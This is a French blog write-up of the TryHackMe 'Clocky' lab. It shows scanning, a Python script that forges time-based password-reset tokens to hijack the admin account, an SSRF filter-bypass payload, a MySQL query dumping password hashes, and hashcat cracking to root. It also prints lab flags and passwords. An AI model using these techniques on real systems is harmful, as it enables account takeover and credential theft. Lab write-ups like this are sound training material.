---
date: 2024-04-10T13:03:18-05:00
# description: ""
image: "/images/THM-Clocky/clocky.png"
showTableOfContents: true
tags: ["TryHackMe"]
categories: ["Writeups"]
title: "THM: Clocky"
type: "post"
---

* Platforme: TryHackMe
* Lien: [Clocky](https://tryhackme.com/r/room/clocky)
* Niveau: Moyen
* OS: Linux
---

Pour ce défi, notre objectif est de trouver six drapeaux. Notre première étape consiste à examiner le fichier `robots.txt` qui contient quelques extensions de fichiers. En utilisant ces extensions de fichiers, nous obtenons une archive et en l'extrayant, nous obtenons le code source d'une application. Après inspection du code, nous identifions un moyen de manipuler le mécanisme de réinitialisation de mot de passe de l'application, ce qui nous permet d'accéder au tableau de bord administratif. 

Le tableau de bord présente un formulaire vulnérable au Server-Side Request Forgery (SSRF), ce qui nous permet de nous procurer un fichier contenant des mots de passe. En combinant les noms d'utilisateurs que nous énumérons et les mots de passe, nous accédons  au système via SSH. 

Une exploration plus poussée révèle la présence d'une base de données mysql; cependant, en essayant de lire le contenu d'une de ses tables, on obtient un résultat indéchiffrable causé par le plugin `cache_sha2_password`. Finalement, en utilisant une requête méticuleusement élaborée, nous réussissons à extraire les hashs des mots de passe dans un format lisible et après les avoir craqués, nous obtenons le mot de passe root.

Adresse IP cible - `10.10.62.39`


## Scanning

```
nmap -sC -sV -oA nmap/Clocky 10.10.62.39
```

**Résultats**

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-09 22:51 CDT
Nmap scan report for 10.10.62.39
Host is up (0.18s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d9:42:e0:c0:d0:a9:8a:c3:82:65:ab:1e:5c:9c:0d:ef (RSA)
|   256 ff:b6:27:d5:8f:80:2a:87:67:25:ef:93:a0:6b:5b:59 (ECDSA)
|_  256 e1:2f:4a:f5:6d:f1:c4:bc:89:78:29:72:0c:ec:32:d2 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.41 (Ubuntu)
8000/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-robots.txt: 3 disallowed entries 
|_/*.sql$ /*.zip$ /*.bak$
|_http-title: 403 Forbidden
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.02 seconds
```

Trois ports sont ouverts: 22 (SSH), 80 (HTTP - Apache) et 8000 (HTTP - Nginx). Les deux serveurs web semblent renvoyer un code d'état 403.

## Flag 1

Les adresses `http://10.10.62.39/` et `http://10.10.62.39:8000/` renvoient toutes deux `403 Fordbidden` comme nous avons pu le voir dans nmap.

![Apache 403 error](/images/THM-Clocky/Apache-403.png)

![Nginx 403 error](/images/THM-Clocky/Nginx-403.png)

Le résultat du scan montre que le service sur le port 8000 a des entrées non autorisées pour `robots.txt`. En visitant `http://10.10.62.39:8000/robots.txt`, nous trouvons une liste de ces mêmes entrées et le drapeau 1.

![Clocky Flag 1](/images/THM-Clocky/flag1.png)

```
THM{14b45bb9eefdb584b79063eca6a31b7a}
```

---

## Flag 2

L'énumération des répertoires sur le premier serveur web avec gobuster est infructueuse, nous passons à ffuf pour trouver les fichiers.

Les extensions mentionnées dans le fichier `robots.txt` sont recherchées. Seul `.zip` renvoie un résultat et nous trouvons `index`.

```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -ic -u http://10.10.62.39:8000/FUZZ.zip
```

![File fuzzing results](/images/THM-Clocky/ffuf-zip.png)

Nous obtenons un fichier appelé `index.zip` après avoir été à l'adresse `http://10.10.62.39:8000/index.zip` et l'extraction de l'archive nous donne le drapeau 2.

![Clocky Flag 2](/images/THM-Clocky/flag2.png)

```
THM{1d3d62de34a3692518d03ec474159eaf}
```
---

## Flag 3

L'archive contient également un fichier python `app.py`, qui semble être le code source d'une application Flask. A la fin du code, nous observons que l'application est accessible sur le port `8080`.

![Flask app on port 8080](/images/THM-Clocky/flask-app-8080.png)

En naviguant vers `http://10.10.62.39:8080/`, nous arrivons sur un site web.

![Clocky website on port 8080](/images/THM-Clocky/clocky-website.png)

Dans le code source, nous trouvons plusieurs points de terminaison tels que:

* `/administrator` qui contient un formulaire de connexion.

![Clocky administrator endpoint](/images/THM-Clocky/administrator.png)

* `/forgot_password` qui permet de réinitialiser un mot de passe après que l'utilisateur ait fourni un nom d'utilisateur valide.

![Clocky forgot_password endpoint](/images/THM-Clocky/password-reset.png)

* `/password_reset`, ce point d'accès mène à une page avec le message `Invalid Parameter`. Dans le code, nous voyons que nous devons fournir une valeur pour le token.

![Clocky forgot_password endpoint](/images/THM-Clocky/pwd_reset.png)

![Clocky token value expected](/images/THM-Clocky/token-expected.png)

De plus, la génération du token est soumise à des contraintes de temps. Voici comment elle fonctionne :

* une fois que l'application confirme dans la base de données que le nom d'utilisateur fourni existe, elle enregistre la date et l'heure du serveur et les stocke dans la variable `value`.
* `value` est ensuite converti en chaîne de caractères et les 4 derniers caractères sont supprimés. Un espace, un point et le nom de l'utilisateur en majuscules sont ensuite ajoutés à la chaîne.
* La variable `lnk` est finalement hachée en utilisant SHA-1 (ce qui n'est pas sécurisé).

![Clocky token value expected](/images/THM-Clocky/token-gen-code.png)

Pour l'exploiter, il faut donc

* fournir un nom d'utilisateur valide 
* synchroniser notre date et notre heure avec celles du serveur
* générer une valeur de token valide 
* réinitialiser le mot de passe du compte administrateur 



Nous utilisons le script ci-dessous pour y parvenir.

```python
import datetime
import hashlib
import requests
import re

# Set the target URL, change the IP acordingly
base_url = 'http://10.10.62.39:8080/' 

# Send a POST request to synchronize time
data = {"username": "administrator"}
requests.post(base_url + "forgot_password", data=data)

# Send a GET request to fetch the current time
response = requests.get(base_url)
if response.status_code == 200:
    time_pattern = r'The current time is (\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})'
    match = re.search(time_pattern, response.text)
    if match:
        current_time_str = match.group(1)
        print("Synchronized time:", current_time_str)  

        # Generate and check valid tokens
        valid_tokens = []
        for ms in range(100):
            ms_str = str(ms).zfill(2)  
            token_data = current_time_str + "." + ms_str + " . " + "administrator".upper()
            hashed_token = hashlib.sha1(token_data.encode("utf-8")).hexdigest()
            response = requests.get(base_url + 'password_reset', params={'token': hashed_token})
            if '<h2>Invalid token</h2>' not in response.text:
                print(f'Generated token: {hashed_token}') 
                valid_tokens.append(hashed_token)

        print("Generated tokens:", valid_tokens) 
    else:
        print("Error: Could not parse server time from response.")
else:
    print("Error: Failed to fetch server response.")

```

Nous utilisons `administrator` pour le nom d'utilisateur valide au niveau de `/forgot_password`.

![administrator account reset](/images/THM-Clocky/admin-reset.png)

Après avoir exécuté le script, nous recevons une valeur de token que nous ajoutons à `/password_reset`.

![python script to generate valid token values](/images/THM-Clocky/clocky-py.png)

```
10.10.62.39:8080/password_reset?token=2233b063a0ebf5505e2cf32a7fa79937d9b561ed
```

La valeur de notre token est correcte et nous sommes capables de réinitialiser le mot de passe de l'utilisateur `administrator`.

![password reset success](/images/THM-Clocky/pwd-reset-success.png)

En retournant à `/dashboard`, nous pouvons nous connecter avec `administrator:mot_de_passe_choisi` et nous obtenons le drapeau 3.

```
THM{ee68e42f755f6ebbcd89439432d7b462}
```

![admin dashboard](/images/THM-Clocky/admin-dashboard.png)

---

## Flag 4

Sur le tableau de bord de l'administrateur, nous pouvons soumettre une valeur pour `Location` et télécharger un fichier. Suite à la capture de la requête avec Burp Suite, je peux voir qu'elle utilise le paramètre `location`.

Il s'avère qu'il est vulnérable au SSRF.

> Le Server-Side Request Forgery (SSRF), traduit en français comme la falsification des requêtes côté serveur, est une vulnérabilité de la sécurité du web. Elle permet à un hacker d’inciter l’application côté serveur à envoyer des requêtes à un endroit non prévu. Avec une attaque SSRF typique, un hacker se sert d’une application web vulnérable pour amener le serveur à interagir afin d’en extraire des fichiers et des données sensibles.  Source - [Cyberuniversity](https://www.cyberuniversity.com/post/ssrf-server-side-request-forgery-quest-ce-que-cest)


Nous avons accès à une liste de payloads sur [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md#bypassing-filters). J'utilise `http://127.0.0.1:80` mais la tentavive échoue et nous obtenons `Action not permitted` en réponse, ce qui implique qu'il y a un filtre que nous devons contourner.

![SSRF test](/images/THM-Clocky/SSRF.png)

J'ai trouvé une liste de payload pour passer les filtres SSRF [ici](https://highon.coffee/blog/ssrf-cheat-sheet/) et le payload `http://0x7f000001/` fonctionne.

![SSRF working payload](/images/THM-Clocky/SSRF-payload.png)

Au début du code source, vous pouvez voir le commentaire à propos de `datbase.sql`. Nous l'utilisons comme nom de fichier et nous obtenons le drapeau 4.

![database.sql file comment](/images/THM-Clocky/db-sql.png)


![Flag 4](/images/THM-Clocky/flag4.png)

```
THM{350020dc1a53e50e1e92bac2c35dd0a2}
```


Après avoir transmis la requête, nous obtenons un fichier appelé `file.txt`.

---

## Flag 5

Le fichier `file.txt` contient le mot de passe `Th1s_1s_4_v3ry_s3cur3_p4ssw0rd` et le nom d'utilisateur `clocky_user`. Le code source mentionne deux autres noms, `jane` et `clarice`.

Après avoir essayé le mot de passe avec les différents utilisateurs, nous arrivons à nous connecter via SSH avec `clarice:Th1s_1s_4_v3ry_s3cur3_p4ssw0rd` et à récupérer le drapeau 5.

![Flag 5](/images/THM-Clocky/flag5.png)

```
THM{e57dfa35e62d518cfd215dd7729d0877}
```

---

## Flag 6

Dans `/home/clarice/app` nous trouvons le fichier caché `.env` qui révèle le mot de passe de la base de données `seG3mY4F3tKCJ1Yj`.

![database password](/images/THM-Clocky/db-pwd.png)

Le résultat de `ss -lntp` confirme que MySQL est installé sur le serveur.

![Internal services running](/images/THM-Clocky/services-intern.png)

Avec les identifiants `clocky_user:seG3mY4F3tKCJ1Yj` nous nous connectons à MySQL.

```
mysql -u clocky_user -p
```

La base de données `clocky` ne contient que les identifiants de l'utilisateur `administrator`. 

Dans la base de données `mysql`, nous trouvons une table `user`.

![mysql database](/images/THM-Clocky/mysql-db.png)

La requête `select * from user` produit un résultat illisible.

![sql query output](/images/THM-Clocky/user-output.png)

Nous voyons que `caching_sha2_password` qui est un plugin d'authentification utilisant sha256 apparaît de façon répétée dans le résultat.

En recherchant "how to dump mysql sha256 hashes with caching_sha2_password?` sur Google, nous trouvons cette [hashcat issue page](https://github.com/hashcat/hashcat/issues/2305?source=post_page-----10e08ab0f1e9--------------------------------) où nous pouvons trouver plusieurs requêtes pour atteindre notre objectif.

```
SELECT user, CONCAT('$mysql',LEFT(authentication_string,6),'*',INSERT(HEX(SUBSTR(authentication_string,8)),41,0,'*')) AS hash FROM user WHERE plugin = 'caching_sha2_password' AND authentication_string NOT LIKE '%INVALIDSALTANDPASSWORD%';
```
![hashes dump](/images/THM-Clocky/hashes-dump.png)

Le hash du premier utilisateur `dev` donne le mot de passe `armadillo`.

```
hashcat -m 7401 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

En utilisant le nouveau mot de passe trouvé, nous nous connectons en tant que root et récupérons le drapeau 6 (le dernier) dans `/root` !

![Flag 6](/images/THM-Clocky/flag6.png)

Ce défi était très intéressant et j'espère que mon article vous sera utile. Je pense que la connaissance de Python devient de plus en plus précieuse pour les professionnels de la cybersécurité et prendre le temps de l'apprendre sera probablement très bénéfique à l'avenir. Vous pouvez lire Automate the Boring Stuff with Python par Al Sweigart gratuitement [ici](http://automatetheboringstuff.com/2e/).

